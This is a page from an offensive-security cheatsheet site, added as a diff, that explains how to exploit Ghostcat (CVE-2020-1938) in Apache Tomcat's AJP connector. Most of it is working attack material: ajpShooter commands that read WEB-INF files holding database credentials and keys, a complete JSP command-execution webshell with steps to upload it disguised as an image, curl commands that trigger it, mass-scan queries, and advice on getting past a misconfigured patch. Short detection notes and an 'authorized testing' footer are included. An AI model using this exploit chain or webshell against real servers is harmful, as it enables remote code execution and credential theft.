@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ghostcat (CVE-2020-1938) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Ghostcat (CVE-2020-1938)</h1><p class="cx-lede">Tomcat AJP file inclusion and RCE via attribute injection - exploitation, scope, and detection.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1210</span><span class="cx-tag">D3FEND D3-SU, D3-ACH, D3-ITF</span><span class="cx-tag">IMPACT FileRead, RCE</span><span class="cx-tag">OWASP A02, A03</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Tomcat's AJP connector has a design flaw: the protocol allows arbitrary servlet attributes (<code>javax.servlet.include.request_uri</code>, <code>.servlet_path</code>, <code>.path_info</code>) to be set per-request. Setting them to point at <code>/WEB-INF/web.xml</code> or any file inside the webapp directory makes Tomcat's <code>DefaultServlet</code> serve that file as a static resource - bypassing the normal restriction that <code>/WEB-INF/</code> is private.</p>
+<p>If the application allows file <em>upload</em> anywhere (avatar, document, even logs), the same primitive can include the uploaded file as a JSP - turning file disclosure into RCE.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># File disclosure
+python ajpShooter.py http://&lt;TARGET&gt;:8080 8009 /WEB-INF/web.xml read
+
+# RCE (requires file upload primitive on the same Tomcat)
+python ajpShooter.py http://&lt;TARGET&gt;:8080 8009 /uploads/shell.jpg eval</code></pre></figure>
+<p>Success indicator: contents of <code>web.xml</code> (or any <code>WEB-INF/</code> file) returned in the response.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<table>
+<thead>
+<tr>
+<th>Tomcat</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>9.0.0.M1 - 9.0.30</td>
+<td>Vulnerable</td>
+</tr>
+<tr>
+<td>8.5.0 - 8.5.50</td>
+<td>Vulnerable</td>
+</tr>
+<tr>
+<td>7.0.0 - 7.0.99</td>
+<td>Vulnerable</td>
+</tr>
+<tr>
+<td>6.x</td>
+<td>Vulnerable (EOL)</td>
+</tr>
+<tr>
+<td>9.0.31+, 8.5.51+, 7.0.100+</td>
+<td>Patched (<code>requiredSecret</code> enforced)</td>
+</tr>
+</tbody>
+</table>
+<p>Patched versions enforce a shared secret on AJP. Without the secret, the attribute-injection primitive doesn't work. But: many real-world Tomcat deployments are patched-but-misconfigured - admins set <code>requiredSecret=""</code> (empty) or revert the setting during troubleshooting.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="file-disclosure">File disclosure</h3>
+<p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">ajpShooter</a> is the canonical tool. It speaks AJP directly, no proxy needed.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
+cd Ghostcat-CNVD-2020-10487
+python ajpShooter.py http://&lt;TARGET&gt;:8080 8009 /WEB-INF/web.xml read</code></pre></figure>
+<p>Targets worth reading:</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/WEB-INF/web.xml</code></td>
+<td>Servlet mappings, sometimes credentials in init-params</td>
+</tr>
+<tr>
+<td><code>/WEB-INF/classes/application.properties</code></td>
+<td>Spring config - DB creds, API keys</td>
+</tr>
+<tr>
+<td><code>/WEB-INF/classes/META-INF/persistence.xml</code></td>
+<td>JPA config - DB creds</td>
+</tr>
+<tr>
+<td><code>/WEB-INF/classes/com/&lt;package&gt;/&lt;Class&gt;.class</code></td>
+<td>Source code (decompile with <code>procyon</code>/<code>cfr</code>)</td>
+</tr>
+<tr>
+<td><code>/META-INF/context.xml</code></td>
+<td>Tomcat context - sometimes manager creds</td>
+</tr>
+<tr>
+<td><code>/WEB-INF/lib/*.jar</code></td>
+<td>Library JARs - version disclosure for chained CVEs</td>
+</tr>
+</tbody>
+</table>
+<p>The <code>http://&lt;TARGET&gt;:8080</code> argument is the HTTP port for response delivery; <code>8009</code> is the AJP port. ajpShooter sends the AJP request and reads the response over the HTTP port the response is forwarded to.</p>
+<h3 id="manual-exploitation-without-ajpshooter">Manual exploitation (without ajpShooter)</h3>
+<p>When you can't run third-party tools - pivoting, restricted box, paranoid op:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Minimal AJP client in Python - sets the three attributes and reads the response
+# See: github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py
+# Or: nmap --script ajp-* scripts (read-only, no file disclosure)</code></pre></figure>
+<p>Realistically, run ajpShooter from a staging box and copy the output. Hand-rolling AJP packets is rarely worth the time.</p>
+<h3 id="escalation-to-rce">Escalation to RCE</h3>
+<p>The attribute-injection primitive doesn't give RCE on its own - it gives <code>DefaultServlet</code> file inclusion. RCE requires <em>also</em> having a way to write a JSP-content file somewhere inside the webapp directory.</p>
+<p>Common upload primitives that yield RCE:</p>
+<div class="cx-steps">
+<ol>
+<li>
+<p><strong>Find any file upload feature.</strong> Avatar, document upload, log import, certificate upload. The file extension does not matter - Ghostcat will execute it as JSP regardless of <code>.jpg</code>/<code>.txt</code>/whatever.</p>
+</li>
+<li>
+<p><strong>Upload a JSP webshell with the wrong extension:</strong></p>
+</li>
+</ol>
+<figure class="cx-code"><figcaption>java</figcaption><pre><code class="language-java">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
+&lt;%
+String cmd = request.getParameter(&quot;c&quot;);
+if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{&quot;sh&quot;,&quot;-c&quot;,cmd});
+    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = r.readLine()) != null) out.println(line);
+}
+%&gt;</code></pre></figure>
+<p>Save as <code>shell.jpg</code>, upload via the avatar feature.</p>
+<ol start="3">
+<li>
+<p><strong>Note the upload path.</strong> Look at the response - many uploaders return the URL like <code>/uploads/12345.jpg</code>. The path inside the webapp filesystem is what you need (<code>/uploads/12345.jpg</code> typically maps to <code>webapps/&lt;app&gt;/uploads/12345.jpg</code>).</p>
+</li>
+<li>
+<p><strong>Trigger via Ghostcat eval mode:</strong></p>
+</li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python ajpShooter.py http://&lt;TARGET&gt;:8080 8009 /uploads/12345.jpg eval</code></pre></figure>
+<p>The <code>eval</code> mode forces JSP processing on the included file. Output appears in the HTTP response.</p>
+<ol start="5">
+<li><strong>Execute commands:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python ajpShooter.py http://&lt;TARGET&gt;:8080 8009 /uploads/12345.jpg eval
+# Then in the response, look for the parameter prompt - or use:
+curl &quot;http://&lt;TARGET&gt;:8080/uploads/12345.jpg?c=id&quot;</code></pre></figure>
+</div>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>The <code>eval</code> primitive runs as the Tomcat user, often <code>tomcat</code> with limited privileges, but sometimes <code>root</code> in container deployments. Either way, RCE - escalate from there with normal Linux privesc tradecraft.</p>
+</div>
+<h2 id="detection-of-vulnerable-hosts">Detection of vulnerable hosts</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Nmap NSE (non-destructive)
+nmap -p 8009 --script ajp-headers &lt;TARGET&gt;
+
+# Banner grab via Metasploit
+msfconsole -q -x &quot;use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS &lt;TARGET&gt;; run; exit&quot;
+
+# Mass scan with Shodan
+# Search: port:8009 product:&quot;Apache Jserv&quot;</code></pre></figure>
+<p>ajpShooter's <code>read</code> mode is itself a detection - request <code>/WEB-INF/web.xml</code> and check whether content is returned (vulnerable) or <code>403</code>/empty (patched or no <code>WEB-INF</code> at that path).</p>
+<h2 id="scope-of-impact">Scope of impact</h2>
+<p>When Ghostcat works, you have:</p>
+<ul>
+<li><strong>Full read access</strong> to anything under the webapp root directory the AJP servlet processes - including configuration files, source code, internal API specs, hardcoded credentials</li>
+<li><strong>Conditional RCE</strong> when combined with any file-write primitive (file upload, log injection if logs land in webapp dir, even SSRF that fetches a file)</li>
+<li><strong>Source code</strong> for decompilation and offline vulnerability discovery (this often reveals additional CVEs for the same target)</li>
+</ul>
+<p>Practical target hierarchy: <code>web.xml</code> first (always) → application config files (Spring/Hibernate) → individual <code>.class</code> files for the most interesting endpoints. Decompile to look for hardcoded creds, JWT secrets, encryption keys, and SQL queries that look exploitable.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong><code>requiredSecret</code> enforced.</strong> ajpShooter returns errors or empty responses. Tomcat is patched-and-configured-correctly. Pivot to the <a href="../index.html">proxy approach</a> if you have manager creds, or move on.</li>
+<li><strong>File disclosure works but RCE doesn't trigger.</strong> The included file isn't a real JSP, or the upload path isn't inside the webapp directory. Check the upload's actual filesystem location (some apps store uploads outside the webapp root, in which case Ghostcat can't include them).</li>
+<li><strong><code>DefaultServlet</code> not mapped.</strong> Some hardened deployments remove the default static-content servlet. Without it, the include primitive has no servlet to abuse. Rare but possible.</li>
+<li><strong>Path traversal blocked.</strong> Ghostcat doesn't actually need traversal - it works with paths <em>inside</em> the webapp dir. If you're trying to read <code>/etc/passwd</code>, you want a different bug; Ghostcat is webapp-dir-scoped.</li>
+<li><strong>Tomcat 9.0.31+ with empty <code>requiredSecret=""</code>.</strong> Looks patched, isn't. The patch enforces <em>some</em> secret being set; an empty string is sometimes accepted depending on configuration. ajpShooter still works.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>Ghostcat is a <em>protocol design</em> flaw, not an implementation bug - which is why it sat unpatched for over a decade. The patch had to introduce a new requirement (<code>requiredSecret</code>) rather than fix existing behavior, because the existing behavior was specified. This is also why "look at the version number" isn't enough on real engagements: a patched Tomcat can still be vulnerable if the secret isn't actually set, and admins frequently disable <code>requiredSecret</code> during migrations and forget to re-enable it.</p>
+<p>The most underrated value of Ghostcat isn't the immediate disclosure - it's the <em>source code access</em>, which gives you offline analysis time on the running application. Pull the JARs, decompile, find the next bug.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../includes/esi/index.html">Previous: ESI Injection</a><a class="cx-next" href="../../ssrf/schemas/index.html">Next: Schemas</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
